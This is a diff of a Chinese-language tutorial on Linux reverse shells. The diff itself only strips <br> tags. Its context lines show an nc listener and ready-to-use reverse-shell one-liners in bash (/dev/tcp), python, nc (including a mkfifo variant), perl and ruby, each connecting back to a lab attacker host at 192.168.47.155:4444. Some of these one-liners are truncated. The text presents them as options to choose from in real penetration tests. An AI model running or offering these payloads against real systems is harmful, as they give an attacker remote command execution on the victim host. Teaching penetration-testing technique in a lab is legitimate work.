@@ -4,7 +4,7 @@ LInux反弹Shell(Reveser Shell), 也可以称为反向Shell, 由被控制端主�
 
 本篇文章介绍LINUX反弹Shell的多种姿势, 在真实的渗透环境中, 根据客户端存在哪些命令的实际情况, 来采取相应的反弹shell姿势
 
-<br>
+
 
 # 实验环境
 
@@ -13,7 +13,7 @@ LInux反弹Shell(Reveser Shell), 也可以称为反向Shell, 由被控制端主�
 | Kali Linux(服务端)   | 192.168.47.155 |
 | Ununtu Linux(客户端) | 192.168.47.151 |
 
-<br>
+
 
 # 服务端监听端口
 
@@ -25,7 +25,7 @@ nc -lvp 4444
 
 ![image-20221126161342759](Linux反弹shell/image-20221126161342759.png)	
 
-<br>
+
 
 # 客户端反弹shell
 
@@ -45,7 +45,7 @@ bash -i >& /dev/tcp/192.168.47.155/4444 0>&1
 
 ![image-20221126173930758](Linux反弹shell/image-20221126173930758.png)	
 
-<br>		
+
 
 ## 2.python反弹
 
@@ -59,7 +59,7 @@ python3 -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SO
 
 ![image-20221126215649332](Linux反弹shell/image-20221126215649332.png)	
 
-<br>
+
 
 ### python2
 
@@ -71,7 +71,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 ![image-20221126222459319](Linux反弹shell/image-20221126222459319.png)	
 
-<br>
+
 
 ## 3.nc反弹shell
 
@@ -85,7 +85,7 @@ nc 192.168.47.155 4444 -e /bin/bash
 
 ![image-20221126220642719](Linux反弹shell/image-20221126220642719.png)	
 
-<br>
+
 
 有些老版本的nc不支持`-e`参数, 可使用如下命令进行反弹
 
@@ -97,7 +97,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.47.155 4444 >/tmp/
 
 ![image-20221126221348830](Linux反弹shell/image-20221126221348830.png)	
 
-<br>
+
 
 ## 4.perl反弹
 
@@ -111,7 +111,7 @@ perl -e 'use Socket;$i="192.168.47.155";$p=4444;socket(S,PF_INET,SOCK_STREAM,get
 
 ![image-20221126222013052](Linux反弹shell/image-20221126222013052.png)	
 
-<br>	
+
 
 ### 不依赖`/bin/sh`	
 
@@ -123,7 +123,7 @@ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.47.1
 
 ![image-20221126222126949](Linux反弹shell/image-20221126222126949.png)	
 
-<br>
+
 
 ## 5.ruby反弹
 
@@ -135,7 +135,7 @@ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.47.155","4444");while(cm
 
 ![image-20221126232254038](Linux反弹shell/image-20221126232254038.png)
 
-<br>
+
 
 ## 6.telnet反弹
 
